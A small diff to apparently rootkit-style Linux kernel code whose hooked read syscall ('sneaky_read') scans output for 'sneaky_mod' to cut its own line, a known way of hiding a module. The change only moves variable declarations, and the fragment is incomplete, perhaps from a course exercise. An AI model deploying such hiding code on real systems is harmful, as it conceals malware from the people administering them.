@@ -112,16 +112,18 @@ asmlinkage ssize_t sneaky_read(struct pt_regs *regs)
 
   char __user *buf = (char *)regs->si;
   ssize_t nread = original_read(regs);
+  void *start;
+  void *end;
   // printk(KERN_INFO "[Sneaky_sys_read]!\n");
 
   if (nread <= 0)
   {
     return nread;
   }
-  char *start = strnstr(buf, "sneaky_mod", nread);
+  start = strnstr(buf, "sneaky_mod", nread);
   if (start != NULL)
   {
-    char *end = strnstr(start, "\n", nread - (start - buf));
+    end = strnstr(start, "\n", nread - (start - buf));
     if (end != NULL)
     {
       ssize_t len = end - start + 1;
